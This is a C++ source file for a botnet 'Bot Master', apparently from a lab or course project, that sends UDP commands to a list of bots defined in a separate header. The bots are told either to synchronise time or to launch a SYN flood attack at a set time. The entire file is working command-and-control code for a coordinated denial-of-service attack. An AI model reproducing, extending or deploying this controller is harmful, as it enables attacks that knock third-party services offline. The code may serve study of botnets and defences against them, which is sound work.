#include <unistd.h>
#include <stdio.h>
#include <iostream>
#include <string.h>
#include <string>
#include <stdlib.h>
#include <math.h>
#include <time.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include "BotProtocol.h"

using namespace std;

void syncCommand(char* cmd);
void attackCommand(char* cmd);
char  attack_time[256];



int main()
{
	int botNum = 2;
	char messageBuffer[1024];
	int messageBufferSize = sizeof(messageBuffer);
	int UDPSocket;     // Socket connected to UDP;
	int UDPPort = 25000;  // UPD port used to send the command to bots;
	int UDPRepeatNum = 1;    // Send UDPRepeatNum commands for one time;
	struct hostent *hostinfo = NULL; //Host name
	cout << "Bot Master started" << endl << endl;

	// Create a UDP socket to send the commands to bots;
	cout << "Preparing socket UDPSocket with port <" << UDPPort << ">...";
	UDPSocket = socket(AF_INET, SOCK_DGRAM, 0);
	if (UDPSocket < 0) {
		cout << "Error at socket()" <<endl;
		return 0;
	}
	sockaddr_in UDPAddr;
	UDPAddr.sin_family = AF_INET;
	UDPAddr.sin_port = htons(UDPPort);
	UDPAddr.sin_addr.s_addr = htonl(INADDR_ANY);
	bind(UDPSocket, (sockaddr *) &UDPAddr, sizeof(UDPAddr)); // Bind the socket to the port;
	cout << "Done" << endl << endl;

	// Infinite loop to send commands;
	int commandType; 
	while (1)
	{
		// Input the command;
		do
		{
			cout << "Input the command(1-Sync, 2-SYNAttack): ";
			cin  >> commandType;
			//if (commandType == 2){
			//	cout << "Attack time: XX:XX:XX.XXXXXX" << endl;
			//	cin.getline(attack_time,256);   // Digest the last newline
			//	cin.getline(attack_time,256);   // Get the real attack_time
			//}
		} while(commandType < 0 || commandType > 2);
		// Send the command to bots;
		for (int i = 0; i < botNum; i++)
		{
			// Prepare the bots address for the UDP packet
			
			sockaddr_in BotAddr;
			BotAddr.sin_family = AF_INET;
			BotAddr.sin_port = htons(botsPort[i]);
			
			hostinfo = gethostbyname(botsIP[i]);
			BotAddr.sin_addr.s_addr = inet_addr(inet_ntoa(*(struct in_addr *)*(hostinfo->h_addr_list)));
			cout << "Preparing the receiver's address: IP<"<< BotAddr.sin_addr.s_addr << "> Port<" << botsPort[i] << ">...";
			//inet_addr(botsIP[i]);
			cout << "Done" << endl;

			// Sending a command;
			char command[1024];
			if (commandType == 1)
				syncCommand(command);
			else
				attackCommand(command);
			memset(messageBuffer, 0, messageBufferSize);  // Empty the Buffer;
			sprintf(messageBuffer, "%s", command);

			cout << "fine"<<endl;
			for (int i = 0; i < UDPRepeatNum; i++)
			{
				cout << "Sending a command: [" << command << "]...";
				sendto(UDPSocket, messageBuffer, strlen(messageBuffer), 0, (sockaddr*) &BotAddr, sizeof(BotAddr));
				cout << "Done" << endl;
			}
		}
		cout << endl;
	}

	// Close all the socket;
	close(UDPSocket);

	return 0;
}

void syncCommand(char* cmd)
{
	sprintf(cmd, "1 - Time Synchronization");
}

void attackCommand(char *cmd)
{
	//sprintf(cmd,"2 - SYN Attack %s", attack_time);
	sprintf(cmd,"2 - SYN Attack %s", attackTime);
}
